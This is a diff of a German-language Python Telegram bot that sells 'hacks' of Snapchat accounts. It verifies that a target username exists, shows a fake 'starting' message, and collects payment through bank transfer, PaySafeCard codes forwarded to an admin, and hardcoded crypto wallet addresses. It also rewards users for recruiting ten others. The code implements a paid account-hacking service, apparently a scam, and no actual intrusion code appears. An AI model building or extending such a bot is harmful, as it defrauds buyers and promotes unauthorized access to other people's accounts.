@@ -30,10 +30,10 @@ def home():
     return "I'm alive"
 
 def keep_alive():
-    port = int(os.environ.get("PORT", 8080))  # Nutzt Render-Port oder 8080 als Backup
+    port = int(os.environ.get("PORT", 8080))
     Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
 
-# Session-Variable für Paysafe-Code-Sendung (simple Variante)
+# Session-Variable für Paysafe-Code-Sendung
 user_paysafe_sent = set()
 
 def check_snapchat_username_exists_and_get_name(username: str):
@@ -46,7 +46,6 @@ def check_snapchat_username_exists_and_get_name(username: str):
         if resp.status_code == 200:
             if "Sorry, this account doesn’t exist." in resp.text or "Not Found" in resp.text:
                 return False, None
-            
             soup = BeautifulSoup(resp.text, "html.parser")
             title = soup.find("title")
             if title:
@@ -73,8 +72,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
-    # Kanal-Mitgliedschaft prüfen
     try:
         member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
         if member.status in ["left", "kicked"]:
@@ -93,10 +90,12 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     username = context.args[0]
-
     exists, name = check_snapchat_username_exists_and_get_name(username)
     if not exists:
-        await update.message.reply_text(f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(
+            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
+            parse_mode=ParseMode.MARKDOWN
+        )
         return
 
     msg = await update.message.reply_text("🚀 Starte den Vorgang...")
@@ -147,10 +146,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Bitte sende hier ein Foto deines Zahlungsbelegs.\n"
             "Wichtig: Gib im Verwendungszweck deinen Telegram-Benutzernamen an."
         )
-        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-
     elif cmd == "pay_paysafe":
         text = (
             "💳 <b>PaySafeCard</b>\n\n"
@@ -159,36 +154,27 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Der Code wird überprüft und weitergeleitet.\n"
             "Bitte warte nach dem Senden auf die Bestätigung."
         )
-        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-
     elif cmd == "pay_crypto":
         text = (
             "🪙 <b>Kryptowährungen</b>\n\n"
-            "- ETH (Ethereum): <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
-            "- BTC (Bitcoin): <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
-            "- LTC (Litecoin): <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n\n"
+            "- ETH: <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
+            "- BTC: <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
+            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n\n"
             "Bitte sende hier ein Foto deines Zahlungsbelegs."
         )
-        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-
     elif cmd == "pay":
-        keyboard = [
-            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
-            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
-            [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+        await pay(update, context)
+        return
+
+    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
 
 async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🎁 <b>Lade Freunde ein und erhalte einen kostenlosen Hack!</b>\n\n"
         "Du bekommst <b>einen Hack gratis</b>, wenn du <b>10 neue Personen</b> über deinen Link einlädst:\n\n"
-        "🔗https://t.me/+xSnJBwXX-g05Yjcy\n\n"
+        "🔗 https://t.me/+xSnJBwXX-g05Yjcy\n\n"
         "Wenn jemand über deinen Link den Bot benutzt, zählt es als gültige Einladung."
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
@@ -214,12 +200,10 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo = update.message.photo[-1]
     caption = update.message.caption or ""
     from_user = update.message.from_user
-
     forward_text = (
         f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {from_user.id})\n\n"
         f"Bildunterschrift:\n{caption}"
     )
-
     try:
         await context.bot.send_photo(
             chat_id=ADMIN_CHAT_ID,
@@ -227,40 +211,42 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=forward_text,
             parse_mode=ParseMode.HTML,
         )
-        await update.message.reply_text("✅ Beweisfoto wurde erfolgreich gesendet!\nBitte warte 5 Minuten auf die Bearbeitung.")
+        await update.message.reply_text("✅ Beweisfoto wurde erfolgreich gesendet!")
     except Exception as e:
         print("Fehler beim Senden des Beweisfotos:", e)
-        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos. Bitte versuche es später erneut.")
+        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
+    from_user = update.message.from_user
 
     if paysafe_pattern.match(text):
-        from_user = update.message.from_user
         if from_user.id in user_paysafe_sent:
-            await update.message.reply_text("Du hast bereits einen Paysafe-Code gesendet. Warte bitte auf die Bearbeitung.")
+            await update.message.reply_text("Du hast bereits einen Paysafe-Code gesendet.")
             return
         user_paysafe_sent.add(from_user.id)
-
-        msg_to_admin = (
-            f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name} (ID: {from_user.id}):\n"
-            f"<code>{text}</code>"
-        )
+        msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name}:\n<code>{text}</code>"
         try:
-            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg_to_admin, parse_mode=ParseMode.HTML)
-            await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!\nBitte warte 5 Minuten auf die Bearbeitung.")
+            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
+            await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")
         except Exception as e:
-            print("Fehler beim Senden des Paysafe-Codes:", e)
-            await update.message.reply_text("❌ Fehler beim Senden deines Paysafe-Codes. Bitte versuche es später erneut.")
+            print("Fehler beim Senden des Codes:", e)
+            await update.message.reply_text("❌ Fehler beim Senden.")
     else:
-        await update.message.reply_text("Unbekannte Nachricht. Bitte nutze die Befehle wie /hack, /pay oder sende Zahlungsbelege als Foto.")
+        await update.message.reply_text("Unbekannter Befehl. Nutze /hack, /pay oder sende Beweise als Foto.")
 
 def main():
     TOKEN = os.getenv("TOKEN")
+    if not TOKEN:
+        raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
+
     global CHANNEL_ID, ADMIN_CHAT_ID
-    CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
-    ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))
+    try:
+        CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
+        ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))
+    except Exception as e:
+        raise ValueError("❌ CHANNEL_ID oder ADMIN_CHAT_ID fehlen oder sind ungültig!")
 
     application = ApplicationBuilder().token(TOKEN).build()
 
@@ -269,13 +255,12 @@ def main():
     application.add_handler(CommandHandler("pay", pay))
     application.add_handler(CommandHandler("invite", invite))
     application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("faq", faq))  # ✅ NEU
-
+    application.add_handler(CommandHandler("faq", faq))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    print("Bot läuft...")
+    print("✅ Bot läuft...")
     application.run_polling()
 
 if __name__ == "__main__":
